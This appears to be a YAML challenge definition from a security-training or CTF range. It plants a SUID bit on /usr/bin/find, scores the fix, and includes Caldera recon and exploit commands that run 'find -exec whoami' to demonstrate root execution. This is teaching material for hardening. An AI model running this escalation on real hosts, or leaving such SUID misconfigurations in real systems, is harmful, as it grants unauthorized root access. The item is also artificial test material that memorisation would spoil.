id: suid_find
name: SUID bit on /usr/bin/find
description: The find command has the SUID bit set, allowing any user to execute it with root privileges. This is a classic privilege escalation vector via find -exec.
type: vulnerability
difficulty: easy
supported_bases: [ubuntu_24_server]
points: 100
category: filesystem
tags: [suid, permissions, privilege-escalation]
conflicts: []
requires: []
script: suid_find.sh
verification:
  type: file_permissions
  path: /usr/bin/find
  expected: "755"
suggested_fix: "chmod 755 /usr/bin/find"
hints:
  - "Look for binaries with unusual permission bits"
  - "Check for SUID bits on common system utilities using: find / -perm -4000 -type f"
caldera:
  tactic: privilege-escalation
  technique:
    attack_id: T1548.001
    name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
  recon:
    description: "Discover the SUID find binary path"
    parser:
      - module: plugins.ctf-exploit.app.parsers.ctf_extract
        mappings:
          - source: ctf.vuln.suid_find
            custom_parser_vals:
              marker: VULNERABLE
              pattern: "path=(\\S+)"
    command: |
      BIN=$(find / -perm -4000 -name find -type f 2>/dev/null | head -1)
      [ -n "$BIN" ] && echo "VULNERABLE path=$BIN" || echo "SECURE: find has normal permissions"
  exploit:
    description: "Escalate privileges via the discovered SUID find -exec"
    command: |
      BIN="#{ctf.vuln.suid_find}"
      "$BIN" /tmp -maxdepth 0 -exec whoami \;

references:
  - title: "Ubuntu Server security documentation"
    url: https://documentation.ubuntu.com/server/explanation/security/intro-to-security/
  - title: "MITRE ATT&CK Enterprise techniques"
    url: https://attack.mitre.org/techniques/enterprise/
